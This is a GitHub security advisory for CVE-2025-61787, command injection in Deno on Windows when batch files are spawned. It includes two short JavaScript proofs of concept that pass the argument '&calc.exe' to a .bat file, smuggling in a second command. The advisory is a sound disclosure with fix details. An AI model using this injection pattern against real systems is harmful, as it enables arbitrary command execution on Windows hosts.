# [H] Deno is Vulnerable to Command Injection on Windows During Batch File Execution

## Summary
Severity: High
Advisory: GHSA-m2gf-x3f6-8hq3
CVE: CVE-2025-61787
CWE: CWE-77
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-10-08
Source: https://github.com/advisories/GHSA-m2gf-x3f6-8hq3
Type: github-advisory

## Affected
- crates.io: `deno` — affected >=0 <2.5.2

## Details
### Summary
Deno versions up to 2.5.1 are vulnerable to Command Line Injection attacks on Windows when batch files are executed.

### Details
In Windows, ``CreateProcess()`` always implicitly spawns ``cmd.exe`` if a batch file (.bat, .cmd, etc.) is being executed even if the application does not specify it via the command line. This makes Deno vulnerable to a command injection attack on Windows as demonstrated by the two proves-of-concept below.

### PoC
Using `node:child_process` (with the `env` and `run` permissions):
```JS
const { spawn } = require('node:child_process');
const child = spawn('./test.bat', ['&calc.exe']);
```
Using `Deno.Command.spawn()` (with the `run` permission):
```JS
const command = new Deno.Command('./test.bat', {
  args: ['&calc.exe'],
});
const child = command.spawn();
```

### Impact
Both of these scripts result in opening calc.exe on Windows, thus allowing a Command Line Injection attack when user-provided arguments are passed if the script being executed by the child process is a batch script.

## References
- https://github.com/denoland/deno/security/advisories/GHSA-m2gf-x3f6-8hq3
- https://nvd.nist.gov/vuln/detail/CVE-2025-61787
- https://github.com/denoland/deno/pull/30818
- https://github.com/denoland/deno/commit/8a0990ccd37bafd8768176ca64b906ba2da2d822
- https://github.com/denoland/deno
- https://github.com/denoland/deno/releases/tag/v2.2.15
- https://github.com/denoland/deno/releases/tag/v2.5.2
